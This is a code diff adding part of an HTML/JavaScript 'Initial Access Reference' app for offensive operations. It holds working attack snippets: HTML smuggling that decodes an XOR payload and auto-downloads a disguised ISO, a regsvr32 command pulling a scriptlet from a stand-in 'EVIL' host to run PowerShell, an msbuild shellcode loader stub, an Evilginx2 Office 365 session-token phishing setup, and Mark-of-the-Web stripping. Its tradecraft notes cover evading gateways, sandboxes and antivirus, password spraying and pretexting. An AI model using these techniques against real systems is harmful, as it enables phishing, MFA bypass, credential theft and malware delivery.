+{t:"HTML smuggling with XOR encoding",l:"js",c:"// HTML smuggling: construct binary in browser\n// This code goes in an .html file\n\n// Payload bytes XOR-encoded with key\nvar key = 0x42;\nvar enc = [0x2c,0x32,0x71,0x0a]; // example (XOR'd)\n\n// Decode at runtime\nvar dec = new Uint8Array(enc.length);\nfor (var i = 0; i < enc.length; i++) {\n    dec[i] = enc[i] ^ key;\n}\n\n// Create blob and trigger download\nvar blob = new Blob([dec],\n    {type: 'application/octet-stream'});\nvar url = URL.createObjectURL(blob);\nvar a = document.createElement('a');\na.href = url;\na.download = 'Invoice_Q4.iso'; // enticing filename\na.click();\n\n// Redirect to decoy\nsetTimeout(function() {\n    window.location = 'https://real-sharepoint.com';\n}, 2000);\n\n// Encoder (attacker-side, Python):\n// key = 0x42\n// with open('payload.iso','rb') as f:\n//     data = f.read()\n// encoded = [b ^ key for b in data]\n// print(','.join(hex(b) for b in encoded))"}
+];
+C.lol=[
+{t:"msbuild inline task execution",l:"xml",c:"// payload.csproj - executes C# via msbuild.exe\n// No compiler needed on target, msbuild handles it\n\n// File: payload.xml (rename to avoid .csproj suspicion)\n// Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe payload.xml\n\n// Content:\n// <Project ToolsVersion=\"4.0\" xmlns=\"...msbuild...\">\n//   <Target Name=\"Run\">\n//     <ClassExample />\n//   </Target>\n//   <UsingTask TaskName=\"ClassExample\"\n//     TaskFactory=\"CodeTaskFactory\"\n//     AssemblyFile=\"Microsoft.Build.Tasks.v4.0.dll\">\n//     <Task>\n//       <Code Type=\"Class\" Language=\"cs\">\n//         using System;\n//         using System.Runtime.InteropServices;\n//         using Microsoft.Build.Utilities;\n//         public class ClassExample : Task {\n//           [DllImport(\"kernel32\")]\n//           static extern IntPtr VirtualAlloc(...);\n//           public override bool Execute() {\n//             // shellcode execution here\n//             return true;\n//           }\n//         }\n//       </Code>\n//     </Task>\n//   </UsingTask>\n// </Project>"},
+{t:"regsvr32 + SCT scriptlet (AppLocker bypass)",l:"js",c:"// COM scriptlet (.sct file) hosted remotely\n// regsvr32 loads and executes it\n// Bypasses AppLocker (regsvr32 is trusted)\n\n// Execute:\n// regsvr32 /s /n /u /i:http://EVIL/payload.sct scrobj.dll\n\n// payload.sct content:\n// <scriptlet>\n//   <registration progid=\"PoC\" classid=\"{GUID}\">\n//     <scr'+'ipt language=\"JScript\">\n//       var r = new ActiveXObject(\"WScript.Shell\")\n//       r.Run(\"powershell -ep bypass -c IEX(...)\")\n//     </scr'+'ipt>\n//   </registration>\n// </scriptlet>\n\n// Advantages:\n// - regsvr32 is a trusted, signed Microsoft binary\n// - Bypasses AppLocker default rules\n// - Downloads from URL (proxy-aware)\n// - No file on disk (in-memory scriptlet)\n// - /s = silent, /n = no DllRegister, /u = unregister\n\n// Detection:\n// - Sysmon EventID 1: regsvr32 with URL argument\n// - Network connection from regsvr32.exe"}
+];
+C.crd=[
+{t:"Evilginx2 O365 phishing setup",l:"bash",c:"# Install and configure Evilginx2\nsudo ./evilginx2 -p phishlets/\n\n# Set domain and IP\nconfig domain phish-domain.com\nconfig ipv4 YOUR_SERVER_IP\n\n# Enable O365 phishlet\nphishlets hostname o365 login.phish-domain.com\nphishlets enable o365\n\n# DNS required:\n# login.phish-domain.com -> YOUR_IP\n# www.phish-domain.com -> YOUR_IP\n# (wildcard if possible)\n\n# Create lure URL:\nlures create o365\nlures edit 0 redirect_url https://office.com\nlures get-url 0\n# Output: https://login.phish-domain.com/RANDOM_PATH\n\n# Send URL to target(s)\n# Victim flow:\n# 1. Clicks link -> sees real O365 login (proxied)\n# 2. Enters email + password (captured)\n# 3. Completes MFA challenge (real MFA)\n# 4. Session token captured by Evilginx2\n# 5. Redirected to real Office 365\n\n# Retrieve captured sessions:\nsessions list\nsessions 1  # view tokens and cookies\n\n# Import token into browser for access"}
+];
+C.kit=[
+{t:"Pre-engagement payload testing checklist",l:"bash",c:"# Test BEFORE sending to target\n\n# 1. Email deliverability\n# Send test to mail-tester.com -> aim for 9+/10\ncurl -s https://mail-tester.com/YOUR_TOKEN\n\n# 2. Gateway bypass test\n# Send benign version through same gateway path\n# Verify: arrives in inbox, not spam/quarantine\n\n# 3. MOTW verification\n# Download payload via same delivery method\n# Right-click -> Properties -> check for 'Unblock'\n# If no Unblock: MOTW successfully bypassed\n\n# 4. SmartScreen test\n# Execute on Windows VM with SmartScreen enabled\n# Verify: no SmartScreen popup\n\n# 5. AV/EDR test (PRIVATE lab only!)\n# Test against target EDR product if known\n# NEVER upload to VirusTotal!\n# Use: antiscan.me (no distribution) or local VM\n\n# 6. Sandbox evasion test\n# Run in: ANY.RUN, Hybrid Analysis (if public is OK)\n# Or: local Cuckoo/CAPE sandbox\n# Verify: payload doesn't detonate in sandbox\n\n# 7. End-to-end test\n# Full chain: email -> click -> execute -> callback\n# Verify C2 receives beacon from test machine"}
+];
+C.byp=[
+{t:"MOTW removal techniques",l:"ps",c:"# MOTW is stored in NTFS Zone.Identifier ADS\n# Check: Get-Content file.exe -Stream Zone.Identifier\n# Output: [ZoneTransfer] ZoneId=3 (internet)\n\n# Method 1: Container bypass (ISO/VHD)\n# Files inside mounted ISO don't inherit MOTW\n# No code needed - just package in ISO\n\n# Method 2: Remove ADS programmatically\nRemove-Item file.exe -Stream Zone.Identifier\n# Or: Unblock-File file.exe\n\n# Method 3: Copy via UNC path\n# Files accessed via UNC may not get MOTW\n# Depends on Zone mapping configuration\n\n# Method 4: PowerShell download without MOTW\n# Some download methods don't set MOTW:\n# [IO.File]::WriteAllBytes('C:\\temp\\file.exe', $bytes)\n# (raw byte write, no stream)\n\n# Method 5: Rename/move across drives\n# Moving from FAT32 USB (no ADS support) to NTFS\n# strips Zone.Identifier\n\n# Verify MOTW is gone:\nGet-Item file.exe -Stream * | Where-Object Stream -eq 'Zone.Identifier'\n# Should return nothing if MOTW removed"}
+];
+return C[s]||[];
+}
+var TR={
+phi:[
+{t:"HTML smuggling + ISO + LNK is the current meta",d:"HTML email delivers clean HTML. JavaScript builds ISO in browser. ISO mounts, contents have no MOTW. LNK inside sideloads DLL. No macros, no SmartScreen, bypasses email gateway."},
+{t:"Macros from internet are blocked by default since 2022",d:"Microsoft blocks VBA macros in files with MOTW. Direct macro attachments are dead for most targets. Workarounds: template injection, container bypass, or non-macro payloads."},
+{t:"LNK files are the most versatile payload carrier",d:"LNK target: cmd, powershell, mshta, rundll32, etc. Custom icon to look like any file type. No macro warning. 1024-char argument limit in explorer, longer via COM."},
+{t:"QR codes bypass all URL scanners",d:"Email gateways scan URLs in email body and attachments. QR codes are images, not URLs. The URL is decoded by the user's phone camera, completely outside the email security stack."}
+],
+ofc:[
+{t:"VBA stomping defeats AMSI scanning",d:"Remove VBA source code from the document but keep compiled p-code. AMSI scans the source (which is empty/benign). p-code still executes. Tool: EvilClippy."},
+{t:"XLM macros don't go through AMSI",d:"Excel 4.0 macros use the legacy macro engine which doesn't integrate with AMSI. No script scanning. Combined with xlVeryHidden sheets, they're hard to analyze."},
+{t:"Template injection splits clean from malicious",d:"The .docx itself is clean and passes all email scanning. The macro is only fetched when the document is opened. Two-stage: clean delivery, malicious execution."},
+{t:"DDE is patched but worth checking",d:"DDE is disabled by default in newer Office. But some organizations haven't updated, or have re-enabled it for business reasons. Worth testing in legacy environments."}
+],
+cnt:[
+{t:"ISO bypass is being patched incrementally",d:"Microsoft is progressively adding MOTW propagation to ISO/VHD mounts. Test against the target's specific Windows build. What worked 6 months ago may not work now."},
+{t:"Password ZIP is the most reliable gateway bypass",d:"Email gateways cannot scan password-protected ZIP contents. Password in the email body is separate from the attachment scan. Simple and effective."},
+{t:"Double container for maximum bypass",d:"ZIP containing an ISO. The ZIP may be scanned (if not password-protected), but the ISO inside contains the actual payload. Contents of ISO still lack MOTW."},
+{t:"7zip MOTW behavior changed in 2023",d:"7zip versions before 23.01 did NOT propagate MOTW to extracted files. Newer versions do. If the target uses old 7zip, extraction strips MOTW automatically."}
+],
+smg:[
+{t:"Email gateway sees HTML, proxy sees JS download",d:"The email attachment is a clean HTML file. No binary to scan. When opened in browser, JavaScript constructs the payload. Network proxy sees HTML page load, not malware download."},
+{t:"XOR key prevents static content scanning",d:"Even if the HTML is analyzed, the payload bytes are XOR/AES encrypted. Without knowing the key, the binary content can't be reconstructed by static analysis."},
+{t:"Auto-download vs save dialog depends on browser",d:"Chrome may auto-download the blob. Edge/Firefox may prompt. Test behavior in the target's likely browser. Set appropriate Content-Disposition for best results."},
+{t:"Redirect to decoy page after download",d:"After the download triggers, redirect to a legitimate-looking page (SharePoint, Google Drive). The user thinks they downloaded from a real service."}
+],
+lol:[
+{t:"msbuild.exe is the most powerful LOLBin",d:"Inline tasks allow full C# execution including shellcode injection. No compiler installation needed. msbuild ships with .NET Framework on every Windows system."},
+{t:"regsvr32 is AppLocker's worst enemy",d:"regsvr32.exe is a trusted Microsoft binary that loads COM scriptlets from URLs. Default AppLocker policies allow it. One command for remote code execution."},
+{t:"certutil is dual-use: download AND decode",d:"certutil can download files (urlcache) AND base64/hex decode them. Download encoded payload, decode on disk, execute. Two LOLBin capabilities in one."},
+{t:"LOLBins generate specific Sysmon events",d:"Every LOLBin execution creates a process creation event (Sysmon 1) with tell-tale command-line arguments. SOCs write rules for: mshta + http, certutil + urlcache, etc."}
+],
+wtr:[
+{t:"Watering holes require upstream compromise first",d:"You need to compromise a website the target visits regularly. This is itself an initial access problem. Industry forums, supplier portals, and niche tools are common targets."},
+{t:"Supply chain is the highest-impact initial access",d:"Compromising a trusted update mechanism or package puts you inside the trust boundary. Signed, distributed, and auto-installed. Extremely hard to detect."},
+{t:"USB drops still work in high-security environments",d:"Despite training, people plug in USB drives. Rubber Ducky and BadUSB devices are physically indistinguishable from normal USB. Effective for air-gapped targets."},
+{t:"Typosquatting packages are a growing threat",d:"PyPI, NPM, and other registries have millions of packages. One typo: 'reqeusts' instead of 'requests' installs malware. Developers often don't verify package names."}
+],
+crd:[
+{t:"Evilginx2 defeats all MFA except FIDO2",d:"Evilginx captures the session token AFTER MFA completion. SMS, push notification, TOTP all defeated. Only FIDO2/WebAuthn is resistant because it's origin-bound."},
+{t:"OAuth consent phishing needs no credentials at all",d:"The user grants permissions to your application. No password stolen, no MFA bypassed. The app maintains access via refresh tokens until explicitly revoked."},
+{t:"Password spray at lockout threshold minus one",d:"If lockout is 5 attempts: try 4 passwords per account across all accounts. Rotate to next password after waiting the lockout window. Low and slow."},
+{t:"MFA fatigue is declining in effectiveness",d:"Microsoft and others now show number matching (approve this number: 47). Push spam is less effective. Still works on legacy MFA without number matching."}
+],
+kit:[
+{t:"Mail-tester.com before every campaign",d:"Score your email deliverability. SPF, DKIM, DMARC, content analysis, blacklist check. Aim for 9+/10. Below 7: your emails are going to spam."},
+{t:"Never test payloads on VirusTotal",d:"VT shares samples with all AV vendors. Your custom payload becomes a signature within hours. Use private analysis: local VM, antiscan.me (no distribution), or your own sandbox."},
+{t:"Test the full chain end-to-end",d:"Email delivery -> user interaction -> payload execution -> C2 callback. Each step can fail independently. Testing only the payload misses delivery and interaction failures."},
+{t:"Pretext is as important as the payload",d:"The most sophisticated payload fails if the user doesn't open it. Research the target: recent invoices, shared drives, team communications. Make the pretext irresistible."}
+],
+byp:[
+{t:"MOTW is the gatekeeper for SmartScreen",d:"SmartScreen only checks files with MOTW. Remove MOTW (via container bypass) and SmartScreen is completely bypassed. No reputation check, no warning dialog."},
+{t:"Sandbox evasion buys you email delivery",d:"Email gateways detonate attachments in sandboxes. If your payload sleeps 5 minutes, checks for domain-join, or requires user interaction, the sandbox times out and passes it."},
+{t:"Email gateway bypass is about the wrapper not the payload",d:"The payload itself (EXE, DLL, shellcode) doesn't matter if it never reaches the user. Focus on the delivery mechanism: HTML smuggling, container bypass, remote template."},
+{t:"MFA bypass is shifting from push spam to token theft",d:"As MFA push fatigue becomes harder, AitM techniques (Evilginx, EvilnoVNC) that capture session tokens are now the primary MFA bypass. Investment in phishing infrastructure pays off."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='phi')flow=fPHI();else if(S.s==='ofc')flow=fOFC();else if(S.s==='cnt')flow=fCNT();
+else if(S.s==='smg')flow=fSMG();else if(S.s==='lol')flow=fLOL();else if(S.s==='wtr')flow=fWTR();
+else if(S.s==='crd')flow=fCRD();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+var thtml=tricks.length===0?'':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Initial Access Reference</h1><div class="sub">Phishing \u2022 Office Attacks \u2022 Containers \u2022 HTML Smuggling \u2022 LOLBins \u2022 Watering Hole \u2022 Credential Harvest \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"Phishing"},{c:"#60a5fa",l:"Office"},{c:"#a78bfa",l:"Containers"},{c:"#fbbf24",l:"Smuggling"},{c:"#34d399",l:"LOLBins"},{c:"#f59e0b",l:"Watering Hole"},{c:"#e879f9",l:"Credentials"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//');if(ci2<0)ci2=line.indexOf("'");if(ci2<0)ci2=line.indexOf('#');
+if(ci2>=0&&(line.charAt(ci2)==='/'||line.charAt(ci2)==="'"||line.charAt(ci2)==='#'))return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);};
+});
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);};
+});
+}
+render();
+</script>
+</body>
+</html>
